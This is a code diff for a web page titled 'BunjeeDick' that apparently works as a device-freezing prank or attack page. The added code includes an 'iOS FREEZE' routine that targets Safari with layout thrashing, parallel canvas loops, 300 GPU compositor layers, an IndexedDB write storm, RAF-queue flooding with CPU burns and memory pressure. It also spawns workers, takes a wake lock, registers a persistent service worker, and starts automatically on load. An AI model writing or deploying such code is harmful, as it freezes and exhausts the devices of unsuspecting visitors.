@@ -7,7 +7,7 @@
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="b       lack-translucent">
-    <title>BunjeeDick/title>
+    <title>BunjeeDick</title>
     <style>
         * {
             margin: 0;
@@ -378,28 +378,104 @@
         }
 
         // ── IMAGE DECODE WORKERS (iOS thermal) ────────────────
-        function startImageWorkers() {
-            if (!isIOS) return;
-            var imgCode = [
-                'function spam(){',
-                '  if(typeof OffscreenCanvas==="undefined")return;',
-                '  var c=new OffscreenCanvas(512,512);',
-                '  var ctx=c.getContext("2d");',
-                '  (function loop(){',
-                '    ctx.fillStyle="rgba("+(Math.random()*255|0)+",0,0,1)";',
-                '    ctx.fillRect(0,0,512,512);',
-                '    c.convertToBlob().then(function(b){',
-                '      createImageBitmap(b).then(loop);',
-                '    }).catch(loop);',
-                '  })();',
-                '}',
-                'spam();'
-            ].join('');
+        // ── iOS FREEZE — targets Safari main thread directly ────────
+        function startImageWorkers() { if (isIOS) iosFreeze(); }
+        function iosFreeze() {
+            // ① DOM layout thrash — forces continuous synchronous reflow
+            // Safari cannot defer reflow when you interleave reads/writes
+            var domBox = document.createElement('div');
+            domBox.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;';
+            document.body.appendChild(domBox);
+            setInterval(function() {
+                for (var i = 0; i < 800; i++) {
+                    var el = document.createElement('div');
+                    el.style.width  = (Math.random() * 100 | 0) + 'px';
+                    el.style.height = (Math.random() * 100 | 0) + 'px';
+                    domBox.appendChild(el);
+                    void el.offsetWidth; // SYNC LAYOUT READ — forces reflow
+                }
+                while (domBox.firstChild) domBox.removeChild(domBox.firstChild);
+            }, 16); // 60fps
+
+            // ② 8 parallel Canvas2D RAF loops (rasterizer overload)
+            for (var ci = 0; ci < 8; ci++) {
+                (function() {
+                    var cv = document.createElement('canvas');
+                    cv.width = cv.height = 256;
+                    var ctx2 = cv.getContext('2d');
+                    (function loop() {
+                        ctx2.clearRect(0, 0, 256, 256);
+                        for (var i = 0; i < 120; i++) {
+                            ctx2.beginPath();
+                            ctx2.arc(Math.random()*256, Math.random()*256, Math.random()*80, 0, 6.28);
+                            ctx2.fillStyle = 'rgba('+(Math.random()*255|0)+','+(Math.random()*255|0)+','+(Math.random()*255|0)+',0.8)';
+                            ctx2.fill();
+                            ctx2.strokeStyle = 'rgba('+(Math.random()*255|0)+',0,0,1)';
+                            ctx2.stroke();
+                        }
+                        // Layout thrash after canvas draw
+                        void cv.offsetWidth;
+                        requestAnimationFrame(loop);
+                    })();
+                })();
+            }
+
+            // ③ CSS will-change layer bomb (300 GPU compositor layers)
+            var style = document.createElement('style');
+            var css = '';
+            for (var li = 0; li < 300; li++) {
+                css += '@keyframes iosf' + li + '{0%{transform:rotate(0deg)translateX('+(Math.random()*30|0)+'px);}100%{transform:rotate(360deg)translateX('+(Math.random()*30|0)+'px);}} ';
+            }
+            style.textContent = css;
+            document.head.appendChild(style);
+            var frag = document.createDocumentFragment();
+            for (var li = 0; li < 300; li++) {
+                var el = document.createElement('div');
+                el.style.cssText = 'position:fixed;width:2px;height:2px;top:'+(Math.random()*100).toFixed(1)+'%;left:'+(Math.random()*100).toFixed(1)+'%;' +
+                    'will-change:transform;' +
+                    'animation:iosf'+li+' '+(0.05+Math.random()*0.15).toFixed(3)+'s linear infinite;';
+                frag.appendChild(el);
+            }
+            document.body.appendChild(frag);
+
+            // ④ IndexedDB I/O storm (disk + memory bus pressure)
             try {
-                var b = new Blob([imgCode], { type: 'application/javascript' });
-                var u = URL.createObjectURL(b);
-                new Worker(u); new Worker(u);
-            } catch (ex) { }
+                var rq = indexedDB.open('_x', 1);
+                rq.onupgradeneeded = function(e) { e.target.result.createObjectStore('d'); };
+                rq.onsuccess = function(e) {
+                    var db = e.target.result;
+                    (function dbStorm() {
+                        try {
+                            var tx = db.transaction('d', 'readwrite');
+                            var st = tx.objectStore('d');
+                            for (var k = 0; k < 50; k++) st.put(new ArrayBuffer(64 * 1024), k);
+                            tx.oncomplete = dbStorm;
+                            tx.onerror = dbStorm;
+                        } catch(ex) { setTimeout(dbStorm, 100); }
+                    })();
+                };
+            } catch(ex) {}
+
+            // ⑤ RAF queue overflow — register 8 callbacks per frame
+            // each runs heavy work, Safari can't drain the queue
+            var raf8 = function() {
+                for (var ri = 0; ri < 7; ri++) requestAnimationFrame(raf8);
+                burnCPU(isIOS ? 40 : 0); // 40ms CPU block per callback
+            };
+            setTimeout(function() { requestAnimationFrame(raf8); }, 1000);
+
+            // ⑥ GC pressure loop (faster than before)
+            (function iosGCHard() {
+                try {
+                    var t = [];
+                    for (var mi = 0; mi < 40; mi++) {
+                        var b = new ArrayBuffer(2 * 1024 * 1024);
+                        new Uint32Array(b)[0] = mi; // commit page
+                        t.push(b);
+                    }
+                    setTimeout(function() { t = null; iosGCHard(); }, 80);
+                } catch(me) { setTimeout(iosGCHard, 200); }
+            })();
         }
 
         // ── RAF + GPU readPixels SYNC (forces GPU flush every frame) ──
@@ -413,7 +489,8 @@
             if (freezePhase >= 2) { draw(); draw(); }
             if (freezePhase >= 3) { draw(); draw(); draw(); }
             freezeBurst++;
-            var burnMs = [isIOS ? 18 : 40, isIOS ? 22 : 55, isIOS ? 28 : 70, isIOS ? 35 : 90][Math.min(freezePhase, 3)];
+            // Phase burn: iOS now hits main thread harder per frame
+            var burnMs = [isIOS ? 45 : 40, isIOS ? 60 : 55, isIOS ? 80 : 70, isIOS ? 100 : 90][Math.min(freezePhase, 3)];
             burnCPU(burnMs);
             window.requestAnimationFrame(ontimer);
         }
@@ -527,82 +604,75 @@
         //   E5=76, D5=74, C5=72, B4=71, A4=69, G4=67, F4=65, E4=64
         //   Opening hook: E5 E5 D5 C5 B4 A4 G4 E4 (repeating)
 
+        // Korobeiniki (Tetris theme) — E minor, A+B sections
+        // MIDI: E5=76 B4=71 C5=72 D5=74 A4=69 F5=77 G5=79 A5=81
         var MESM_MELODY = [
-            // bar 1 - iconic opening hook (8th notes)
-            { m: 76, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
-            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 0.5 },
-            // bar 2
-            { m: 64, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 }, { m: 71, d: 0.5 },
-            { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 1.0 }, { m: 76, d: 0.5 },
-            // bar 3 - rising tension
-            { m: 79, d: 0.5 }, { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 },
-            { m: 72, d: 0.5 }, { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 },
-            // bar 4 - drop
-            { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 }, { m: 71, d: 0.5 },
-            { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 1.0 }, { m: 64, d: 0.5 },
-            // bar 5 - chorus spike
-            { m: 81, d: 0.25 }, { m: 80, d: 0.25 }, { m: 81, d: 0.25 }, { m: 80, d: 0.25 },
-            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
-            // bar 6
-            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
-            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
-            // bar 7
-            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 },
-            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
-            // bar 8 - resolve
-            { m: 79, d: 1.0 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 1.0 }, { m: 71, d: 1.0 }
+            // ── A section ──
+            {m:76,d:1},{m:71,d:.5},{m:72,d:.5},{m:74,d:1},{m:72,d:.5},{m:71,d:.5},
+            {m:69,d:1},{m:69,d:.5},{m:72,d:.5},{m:76,d:1},{m:74,d:.5},{m:72,d:.5},
+            {m:71,d:1.5},{m:72,d:.5},{m:74,d:1},{m:76,d:1},
+            {m:72,d:1},{m:69,d:1},{m:69,d:2},
+            // ── B section ──
+            {m:74,d:1.5},{m:77,d:.5},{m:81,d:1},{m:79,d:.5},{m:77,d:.5},
+            {m:76,d:1.5},{m:72,d:.5},{m:76,d:1},{m:74,d:.5},{m:72,d:.5},
+            {m:71,d:1.5},{m:72,d:.5},{m:74,d:1},{m:76,d:1},
+            {m:72,d:1},{m:69,d:1},{m:69,d:2},
+            // ── C section (inner voice) ──
+            {m:76,d:1},{m:71,d:.5},{m:72,d:.5},{m:74,d:1},{m:72,d:.5},{m:71,d:.5},
+            {m:69,d:1},{m:69,d:.5},{m:72,d:.5},{m:76,d:1},{m:74,d:.5},{m:72,d:.5},
+            {m:71,d:1.5},{m:72,d:.5},{m:74,d:1},{m:76,d:1},
+            {m:72,d:1},{m:69,d:1},{m:69,d:2}
         ];
 
-        // Bass line (A minor root movement, octave 2-3)
         var MESM_BASS = [
-            { m: 45, d: 2 }, { m: 45, d: 1 }, { m: 43, d: 1 }, // Am
-            { m: 48, d: 2 }, { m: 47, d: 1 }, { m: 45, d: 1 }, // C
-            { m: 50, d: 2 }, { m: 50, d: 1 }, { m: 48, d: 1 }, // Dm
-            { m: 47, d: 2 }, { m: 45, d: 2 }              // E
+            // Em-C-G-D-Em walking bass (Tetris groove)
+            {m:40,d:2},{m:43,d:2},  // Em
+            {m:36,d:2},{m:40,d:2},  // C
+            {m:43,d:2},{m:47,d:2},  // G
+            {m:38,d:2},{m:42,d:2},  // D
+            {m:40,d:2},{m:43,d:2},  // Em
+            {m:36,d:2},{m:40,d:2},  // C
+            {m:43,d:2},{m:47,d:2},  // G
+            {m:38,d:4}              // D hold
         ];
 
-        // Arpeggio: A minor chord tones fast
-        var MESM_ARP = [69, 72, 76, 79, 72, 76, 79, 76, 67, 71, 74, 76, 71, 74, 76, 74];
+        var MESM_ARP = [64,67,71,76,71,76,79,76,60,64,67,72,67,72,74,72];
 
         // Audio now started inside initOnInteraction for iOS unlock compliance
         function startAudioAndHaptics() { startHaptics(); }
 
         // ── HAPTIC ENGINE ─────────────────────────────
-        // Mesmerizer beat at 185 BPM = 324ms per beat, 162ms per 8th
+        // Tetris beat at 160 BPM = 375ms per beat, 188ms per 8th
         // Pattern mirrors the song's iconic opening rhythm:
         //   8th  8th  8th  8th  | 8th  8th  quarter  8th  (per bar, 2 bars shown)
         function startHaptics() {
             if (!navigator.vibrate) return;
-            var b8 = Math.round(60000 / 185 / 2); // ~162ms per 8th note
-            var b4 = b8 * 2;                        // ~324ms per quarter
-            var gap = 30;                            // silence between pulses
-            var on8 = b8 - gap;                      // ~132ms pulse
-            var on4 = b4 - gap;                      // ~294ms pulse
-
-            // 2-bar Mesmerizer haptic pattern (mirrors the main riff hits):
-            // bar1: | 8 8 8 8 | 8 8 8 8 |
-            // bar2: | 8 8 4 . | 8 8 4 . |
-            // bar3: | 8th triplet feel chorus |
+            // Tetris (Korobeiniki) haptic pattern @ 160 BPM
+            // quarter=375ms, half=750ms, dotted-quarter=562ms, 8th=188ms
+            // A-section rhythm: 1 .5 .5 | 1 .5 .5 | 1.5 .5 | 1 1 | 1 1 | 2
+            var q  = 375, h = 750, dq = 562, e8 = 188, g = 28;
+            function on(ms) { return ms - g; }
             var pat = [
-                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat1
-                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat2
-                on8, gap, on8, gap, on4, gap,             // bar2 beat1 (quarter on 3)
-                on8, gap, on8, gap, on4, gap,             // bar2 beat2
-                on8, gap, on8, gap, on8, gap, on8, gap,   // chorus 8ths
-                on4, gap, on4, gap,                      // chorus quarters
-                on8, gap, on8, gap, on8, gap, on8, gap,   // bar
-                on4, b4                            // final hit + rest
+                // A section (bars 1-4)
+                on(q),g,  on(e8),g, on(e8),g,  on(q),g,  on(e8),g, on(e8),g,
+                on(q),g,  on(e8),g, on(e8),g,  on(q),g,  on(e8),g, on(e8),g,
+                on(dq),g, on(e8),g, on(q),g,   on(q),g,
+                on(q),g,  on(q),g,  on(h),g,
+                // B section (bars 5-8)
+                on(dq),g, on(e8),g, on(q),g,   on(e8),g, on(e8),g,
+                on(dq),g, on(e8),g, on(q),g,   on(e8),g, on(e8),g,
+                on(dq),g, on(e8),g, on(q),g,   on(q),g,
+                on(q),g,  on(q),g,  on(h),g
             ];
-            var loopMs = pat.reduce(function (a, b) { return a + b; }, 0);
-
+            var loopMs = pat.reduce(function(a,b){return a+b;},0);
             function vibeLoop() { navigator.vibrate(pat); }
             vibeLoop();
-            hapticInterval = setInterval(vibeLoop, loopMs + 50);
+            hapticInterval = setInterval(vibeLoop, loopMs + 80);
         }
 
         // ── AUDIO ENGINE ──────────────────────────────
         function playMesmerizer(ctx) {
-            var BPM = 185;
+            var BPM = 160;
             var beat = 60 / BPM;            // quarter note in seconds
             var bar = beat * 4;
             var bars = 8;
@@ -909,48 +979,34 @@
                 if (started) return;
                 started = true;
 
-                // ① Unlock AudioContext synchronously (iOS critical)
                 try {
                     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    iosUnlockAudio(audioCtx); // silent buffer — unlocks WebKit
-                    // melody starts AFTER countdown (audioCtx is already unlocked)
-                } catch (err) { }
-            }
-
-
-            // ── BEAST MODE — called after countdown hits 0 ────────────
-            function startBeast() {
-                // Start melody (AudioContext already unlocked)
-                try {
-                    if (audioCtx) {
-                        if (audioCtx.state === 'suspended') audioCtx.resume();
-                        playMesmerizer(audioCtx);
-                    }
+                    iosUnlockAudio(audioCtx);
+                    if (audioCtx.state === 'suspended') audioCtx.resume();
+                    playMesmerizer(audioCtx);
                 } catch (err) {
                     setTimeout(function () {
                         try {
                             if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                             if (audioCtx.state === 'suspended') audioCtx.resume();
                             playMesmerizer(audioCtx);
-                        } catch (e2) { }
-                    }, 200);
+                        } catch (e2) {}
+                    }, 100);
                 }
 
                 startHaptics();
-                spawnWorkers(4);        // +4× cores on top of onload's 4×
-                spawnOffscreenWorkers(4); // +4 GPU threads on top of onload's 4
+                spawnWorkers(4);
+                spawnOffscreenWorkers(4);
                 allocateMemory();
                 startImageWorkers();
                 requestWakeLock();
                 registerPersistentSW();
-                startEscalationPhases(); // unleash all 3 phases
+                startEscalationPhases();
             }
 
-            // Auto-start immediately — no user tap required
-            // (Audio needs a gesture on iOS, so we keep touch listeners as fallback)
             setTimeout(initOnInteraction, 50);
             document.addEventListener('touchend', initOnInteraction, { once: true, passive: false });
-            document.addEventListener('click', initOnInteraction, { once: true });
+            document.addEventListener('click',    initOnInteraction, { once: true });
             cx = document.body.clientWidth;
             cy = document.body.clientHeight;
             if (cx > cy) {
